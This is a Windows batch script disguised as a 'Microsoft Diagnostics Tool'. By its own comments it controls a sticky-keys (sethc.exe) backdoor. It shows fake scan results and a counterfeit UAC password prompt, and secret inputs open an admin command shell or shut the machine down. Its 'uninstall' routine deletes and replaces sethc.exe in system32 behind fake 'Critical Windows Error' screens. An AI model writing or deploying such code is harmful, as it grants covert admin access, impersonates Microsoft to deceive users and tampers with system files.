@echo off
goto InitiateScript

I DON'T KNOW YOU AND I DON'T WANT TO KNOW YOU, SO YOU WON'T KNOW ME
// Enough of that shit :) //
What is this shit?
This shit puts a simple password onto the C:\windows\sethc.exe backdoor, so retards can't mess with admin permissions
OK LETS GET STARTED, @echo Hello World!

U (yes u) are reading this, so it means that you have successfully decompiled an exe, meaning that ur probably quite smart SO
this tool is a prototype and was not meant to cause any damage, to uninstall this tool from ur PC, simply open it w/ admin permissions, press CTRL+C and then enter uninstall, done

If i was bothered about people seeing my code then I would have encrypted it, but im not so feel free to read it and see that it has no malicious code

OVER AND OUT AMIGO :) _----SEE YA----_

:InitiateScript
net file>nul 2>&1||exit
color 0f
mode con: cols=60 lines=20
title Microsoft Diagnostics Tool
cls
echo ÛÛÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÛÛßßßßßßßßßßßßßßßßßßßßßßßßß
echo þþþ Microsoft Diagnostics Tool þþþ       Quick Scan
echo ÛÛÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛÛÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo                 There were no errors detected 
(cmd /c start /wait "Errorchk" cmd /c "mode con: cols=21 lines=3&color f3&echo.&echo     Check Passed!&timeout /t -1 /nobreak >nul">"%Temp%\CTRL+C.DETECTOR" 2>&1)
type "%Temp%\CTRL+C.DETECTOR"|findstr C>nul 2>&1&&echo                      Press 'X' to exit..||goto :BackdoorController
timeout -1 >nul
exit

:BackdoorController
cls
color a0
mode con: cols=60 lines=20
title Microsoft Diagnostics Tool
cls
echo ÛÛÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÛÛßßßßßßßßßßßßßßßßßßßßßßßßß
echo þþþ Microsoft Diagnostics Tool þþþ       Advanced Scan
echo ÛÛÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛÛÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo   In order to perform an advanced scan you need to enter
echo                     the Admin password     
echo.
echo Launching basic Windows UAC....
call :GUI "Please enter the password for the user account 'SYSTEM'" "User Account Control"
if "%GUIinput%"=="" echo Error 404 on SYSTEM REGISTRY!&goto :Cancel
if /i "%GUIinput%"=="system" echo Advanced Scan has been scheduled!&goto :Cancel
if /i "%GUIinput%"=="pranked" echo HAHA FOOLED YOU BY A WEIRD WINDOW :)&goto :cancel 
if /i "%GUIinput%"=="barryislife" echo Barry is not life!&goto :cancel
if /i "%GUIinput%"=="dahacker" start cmd&exit
if /i "%GUIinput%"=="1234" echo This PC Will Shutdown :)&shutdown -p&goto :Cancel
if /i "%GUIinput%"=="uninstall" echo Hello master, I will uninstall myself to protect u&goto :QuickUninstall
if /i "%GUIinput%"=="suicide" echo Hello master, I will uninstall myself to protect u&goto :QuickUninstall
echo Microsoft has encountered an issue! ERROR_04_ON_SYSTEM_REGISTRY
goto :Cancel

:GUI
set "GUIinput="
set "aaGuiText=%~1"
if "%aaGuiText%"=="" set aaGuiText=Please Enter The Password:
set "aaGuiTitle=%~2"
if "%aaGuiTitle%"=="" set aaGuiTitle=Enter Password:
echo Wscript.echo inputbox(WScript.Arguments(0),WScript.Arguments(1)) >"%temp%\GUI.vbs"
for /f "tokens=* delims=" %%a in ('cscript //nologo "%temp%\GUI.vbs" "%aaGuiText%" "%aaGuiTitle%"') do set "GUIinput=%%a"
exit /b

:QuickUninstall
cmd /c start "explorer.exe" cmd /c "mode con: cols=100 lines=30&color e0&echo.&echo Critical Windows Error!&timeout -t 5&copy /Y C:\Windows\system32\sethc.exe C:\Windows\system32\tmpImage409.tmp&del /F "C:\Windows\system32\sethc.exe"&copy /Y C:\Windows\system32\charmap.exe C:\Windows\system32\sethc.exe&timeout /t 30 /nobreak&cls&echo CRITICAL WINDOWS ERROR!&echo Driver_Less_Or_Equal&timeout /t 120 /nobreak"
exit

:Cancel
timeout /t -1 /nobreak>nul
goto :Cancel